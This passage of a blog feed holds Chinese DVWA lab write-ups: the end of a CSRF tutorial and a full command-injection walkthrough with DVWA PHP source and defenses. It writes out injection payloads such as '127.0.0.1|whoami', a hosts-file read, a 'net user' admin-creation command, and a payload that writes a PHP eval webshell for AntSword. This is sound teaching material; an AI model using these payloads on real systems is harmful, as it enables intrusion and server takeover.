class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们将该代码通过存储型XSS插入到数据库中，这语句会弹出用户的token</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210719222409.png"></p></li></ul><p>拿到token之后攻击者就可以构造恶意链接来实现csrf了</p><p><em><strong>可以看出加入了token的服务器是很难实现csrf的</strong></em></p><h3 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );<span class="comment">//加入token</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line"><span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Do the passwords match?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line"><span class="comment">// They do!</span></span><br><span class="line"><span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"><span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Update the database</span></span><br><span class="line"><span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Feedback for the user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Issue with passwords matching</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Impossible级别"><a href="#Impossible级别" class="headerlink" title="Impossible级别"></a>Impossible级别</h2><p>由high级别的web页面来看加入了输入最近一次使用的密码，攻击者不可能知道用户的上一次密码所以也就无法构造出修改密码的链接</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210719222226.png"></p><h3 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$pass_curr</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_current&#x27;</span> ];</span><br><span class="line"><span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line"><span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sanitise current password input</span></span><br><span class="line"><span class="variable">$pass_curr</span> = stripslashes( <span class="variable">$pass_curr</span> );</span><br><span class="line"><span class="variable">$pass_curr</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_curr</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"><span class="variable">$pass_curr</span> = md5( <span class="variable">$pass_curr</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check that the current password is correct</span></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27;</span> );</span><br><span class="line"><span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line"><span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:password&#x27;</span>, <span class="variable">$pass_curr</span>, PDO::PARAM_STR );</span><br><span class="line"><span class="variable">$data</span>-&gt;execute();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Do both new passwords match and does the current password match the user?</span></span><br><span class="line"><span class="keyword">if</span>( ( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &amp;&amp; ( <span class="variable">$data</span>-&gt;rowCount() == <span class="number">1</span> ) ) &#123;</span><br><span class="line"><span class="comment">// It does!</span></span><br><span class="line"><span class="variable">$pass_new</span> = stripslashes( <span class="variable">$pass_new</span> );</span><br><span class="line"><span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"><span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Update database with new password</span></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;UPDATE users SET password = (:password) WHERE user = (:user);&#x27;</span> );</span><br><span class="line"><span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:password&#x27;</span>, <span class="variable">$pass_new</span>, PDO::PARAM_STR );</span><br><span class="line"><span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line"><span class="variable">$data</span>-&gt;execute();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Feedback for the user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Issue with passwords matching</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><p>可见CSRF攻击是源于Web的隐式身份验证机制</p><p>常用的防御方法有：</p><ul><li><p>加验证码</p><p>验证码，强制用户必须与应用进行交互，才能完成最终请求。在通常情况下，验证码能很好遏制CSRF攻击。但是出于用户体验考虑，网站不能给所有的操作都加上验证码。因此验证码只能作为一种辅助手段，不能作为主要解决方案。 </p></li><li><p>Referer Check</p><p>Referer Check在Web最常见的应用就是”防止图片盗链”。同理，Referer Check也可以被用于检查请求是否来自合法的”源”（Referer值是否是指定页面，或者网站的域），如果都不是，那么就极可能是CSRF攻击。 </p><p>但是因为服务器并不是什么时候都能取到Referer，所以也无法作为CSRF防御的主要手段。但是用Referer Check来监控CSRF攻击的发生，倒是一种可行的方法。   </p></li><li><p>Anti CSRF Token（现在业界对CSRF的防御，一致的做法是使用一个Token）</p><ol><li><p>用户访问某个表单页面。 </p></li><li><p>服务端生成一个Token，放在用户的Session中，或者浏览器的Cookie中。 </p></li><li><p>在页面表单附带上Token参数。 </p></li><li><p>用户提交请求后， 服务端验证表单中的Token是否与用户Session（或Cookies）中的Token一致，一致为合法请求，不是则非法请求。 </p></li></ol><p>CSRF的Token仅仅用于对抗CSRF攻击。当网站同时存在XSS漏洞时候，那这个方案也是空谈。</p></li></ul><blockquote><p><a href="https://blog.csdn.net/qq_36119192/article/details/82918141">https://blog.csdn.net/qq_36119192/article/details/82918141</a></p><p><a href="https://blog.csdn.net/qq_15096707/article/details/51307024">https://blog.csdn.net/qq_15096707/article/details/51307024</a></p><p><a href="https://www.cnblogs.com/allenyip/p/10852400.html">https://www.cnblogs.com/allenyip/p/10852400.html</a></p></blockquote><p>附：存储型XSS如何获取用户cookie</p><blockquote><p><a href="https://blog.csdn.net/qq_36609913/article/details/79066320">https://blog.csdn.net/qq_36609913/article/details/79066320</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> WEB安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSRF </tag>
            
            <tag> web安全 </tag>
            
            <tag> DVWA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA之命令执行漏洞复现</title>
      <link href="/2021/07/19/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/07/19/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system，exec，shell_exec等，当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击。在操作系统中，“&amp;、|、||”都可以作为命令连接符使用，用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令(如添加一个名为admin 密码为admin的用户 net user admin admin/add net localgroup administrators admin /add 加入管理员组（赋予管理员权限）)</p><h2 id="命令执行常用函数"><a href="#命令执行常用函数" class="headerlink" title="命令执行常用函数"></a><strong>命令执行常用函数</strong></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span>. System：system函数可以用来执行一个外部的应用程序并将相应的执行结果输出，函数原型如下：</span><br><span class="line"><span class="keyword">string</span> system(<span class="keyword">string</span> command, <span class="keyword">int</span>&amp;return_var)</span><br><span class="line"> 其中，command是要执行的命令，return_var存放执行命令的执行后的状态值。</span><br><span class="line"> <span class="number">2</span>. Exec：exec函数可以用来执行一个外部的应用程序</span><br><span class="line"><span class="keyword">string</span> exec (<span class="keyword">string</span> command, <span class="keyword">array</span>&amp;output, <span class="keyword">int</span> &amp;return_var)</span><br><span class="line">其中，command是要执行的命令，output是获得执行命令输出的每一行字符串，return_var存放执行命令后的状态值。</span><br><span class="line"> <span class="number">3</span>.Passthru：passthru函数可以用来执行一个UNIX系统命令并显示原始的输出，当UNIX系统命令的输出是二进制的数据，并且需要直接返回值给浏览器时，需要使用passthru函数来替代system与exec函数。Passthru函数原型如下：</span><br><span class="line"><span class="keyword">void</span> passthru (<span class="keyword">string</span> command, <span class="keyword">int</span>&amp;return_var)</span><br><span class="line">其中，command是要执行的命令，return_var存放执行命令后的状态值。</span><br><span class="line"> <span class="number">4</span>. Shell_exec：执行shell命令并返回输出的字符串，函数原型如下：</span><br><span class="line"><span class="keyword">string</span> shell_exec (<span class="keyword">string</span> command)</span><br><span class="line">其中，command是要执行的命令。</span><br></pre></td></tr></table></figure><h2 id="常用的命令连接符"><a href="#常用的命令连接符" class="headerlink" title="常用的命令连接符"></a>常用的命令连接符</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">command1&amp;command2 两个命令同时执行</span><br><span class="line">command1&amp;&amp;command2 只有前面命令执行成功，后面命令才继续执行</span><br><span class="line">command1;command2 不管前面命令执行成功没有，后面的命令继续执行、</span><br><span class="line">command1|command2 第一个命令的输出作为第二个命令的输入</span><br><span class="line">command1||command2 顺序执行多条命令，当碰到执行正确的命令后将不执行后面的命令</span><br><span class="line">command1 `command2`，command2的执行结果会在command1的报错信息中显示。</span><br></pre></td></tr></table></figure><h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><p><strong>查看系统敏感文件</strong></p><p>提交参数[?cmd=command1|type c:\windows\system32\drivers\etc\hosts],查看系统hosts文件。</p><p><strong>执行系统命令</strong></p><p>如提交参数[?cmd=command1|whoami]查看当前用户</p><p><strong>写shell</strong></p><p>提交参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=command1|echo &quot;&lt;?php @eval($_POST[&#x27;shell&#x27;]); ?&gt;&quot; &gt; shell.php</span><br></pre></td></tr></table></figure><p>页面没有报错，说明写入文件成功。然后利用蚁剑来getshell</p><h2 id="DVWA-命令注入"><a href="#DVWA-命令注入" class="headerlink" title="DVWA 命令注入"></a>DVWA 命令注入</h2><h2 id="low级别"><a href="#low级别" class="headerlink" title="low级别"></a>low级别</h2><p>输入127.0.0.1|whoami,尝试看是否能执行第二个命令</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210719151715.png"></p><p>返回结果，表明注入成功：</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210719151730.png"></p><p>查看low级别源码发现没有做任何过滤，直接将前端输入的参数与ping结合执行命令：</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210719151744.png"></p><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>输入框输入127.0.0.1|echo “<?php @eval($_POST['shell']); ?>“ &gt; shell1.php</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210720212200.png"></p><p>点击提交后就会在当前目录生成shell1.php</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210720212208.png"></p><p>然后用蚁剑连接，getshell！</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210720212211.png"></p><p>以下级别的getshell部分如上一样，所以不再赘述，只讲命令注入如何绕过后端过滤</p><h2 id="Medium级别"><a href="#Medium级别" class="headerlink" title="Medium级别"></a>Medium级别</h2><p>继续尝试使用127.0.0.1|whoami进行漏洞测试：</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210719151715.png"></p><p>发现还是没有过滤|管道符，注入成功：</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210719151730.png"></p><p>查看medium级别源码发现虽然做了输入过滤但是没有过滤管道符：</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210719151832.png"></p><h2 id="high级别"><a href="#high级别" class="headerlink" title="high级别"></a>high级别</h2><p>继续尝试使用127.0.0.1|whoami进行漏洞测试：</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210719151715.png"></p><p>发现还是没有过滤管道符QwQ，服了：</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210719151730.png"></p><p>查看源码发现其过滤了大部分连接符，但仔细看过滤的是管道符+空格，所以依然没有过滤管道符：</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210719151842.png"></p><h2 id="Impossible级别"><a href="#Impossible级别" class="headerlink" title="Impossible级别"></a>Impossible级别</h2><p>查看源码，发现针对ping这个命令其防守思路是先将前端传过来的参数按.分割开然后分别判断每一部分是否是数字，如果每一部分都是那么重新拼接然后执行命令，该方法能抵御所有连接符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line"><span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"><span class="variable">$target</span> = stripslashes( <span class="variable">$target</span> );<span class="comment">//stripslashes()函数对获取的用户的输入target字符串中的反斜杠删除，返回删除发斜杠后的字符串。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Split the IP into 4 octects</span></span><br><span class="line"><span class="variable">$octet</span> = explode( <span class="string">&quot;.&quot;</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check IF each octet is an integer</span></span><br><span class="line"><span class="keyword">if</span>( ( is_numeric( <span class="variable">$octet</span>[<span class="number">0</span>] ) ) &amp;&amp; ( is_numeric( <span class="variable">$octet</span>[<span class="number">1</span>] ) ) &amp;&amp; ( is_numeric( <span class="variable">$octet</span>[<span class="number">2</span>] ) ) &amp;&amp; ( is_numeric( <span class="variable">$octet</span>[<span class="number">3</span>] ) ) &amp;&amp; ( sizeof( <span class="variable">$octet</span> ) == <span class="number">4</span> ) ) &#123;</span><br><span class="line"><span class="comment">// If all 4 octets are int&#x27;s put the IP back together.</span></span><br><span class="line"><span class="variable">$target</span> = <span class="variable">$octet</span>[<span class="number">0</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">1</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">2</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line"><span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line"><span class="comment">// Windows</span></span><br><span class="line"><span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// *nix</span></span><br><span class="line"><span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Feedback for the end user</span></span><br><span class="line"><span class="comment">// If all 4 octets are int&#x27;s put the IP back together.</span></span><br><span class="line"><span class="variable">$target</span> = <span class="variable">$octet</span>[<span class="number">0</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">1</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">2</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line"><span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line"><span class="comment">// Windows</span></span><br><span class="line"><span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// *nix</span></span><br><span class="line"><span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Feedback for the end user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Ops. Let the user name theres a mistake</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>做下来发现低中高级别的差异也就是在过滤的全面性这方面有所不同，而就算是high级别也漏掉了一些连接符导致产生漏洞，所以针对命令执行漏洞还是Impossible的方法比较好</p><h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><p><strong>禁用高危系统函数</strong></p><p>phpinfo() 、eval() 、passthru() 、chroot()、 scandir()、chgrp() 、 chown() 、 shell_exec() 、 proc_open()、proc_get_status() 、 ini_alter() 、ini_alter()、ini_restore()、dl()、 pfsockopen() 、 openlog() 、syslog()、 readlink()、symlink() 、 popepassthru() 、stream_socket_server() 、fsocket() 、 fsockopen()</p><p>在php安装目录中找到php配置文件php.ini，找到disable_functions，在后面添加禁用的函数名，函数名之间以英文逗号分隔</p><p><strong>严格过滤特殊字符</strong></p><p>从前面的例子可以发现在利用命令执行漏洞时会利用一些特殊的连接符，用来拼接执行的命令。对此，可创建仅包含允许的字符或命令列表的白名单以验证用户输入。</p><p><strong>开启safe_mode</strong></p><p>safe_mode : php安全模式，通俗的说就是以安全模式运行php</p><p>在php.ini文件里面设置safe_mode = On即可开启</p><blockquote><p><a href="https://segmentfault.com/a/1190000021855624">https://segmentfault.com/a/1190000021855624</a></p><p><a href="https://www.jianshu.com/p/720649d2427f">https://www.jianshu.com/p/720649d2427f</a></p><p><a href="https://www.wawyw.top/posts/4134.html">https://www.wawyw.top/posts/4134.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> WEB安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> DVWA </tag>
            
            <tag> 命令执行漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang之gin框架</title>
      <link href="/2021/07/15/gin/"/>
      <url>/2021/07/15/gin/</url>
      
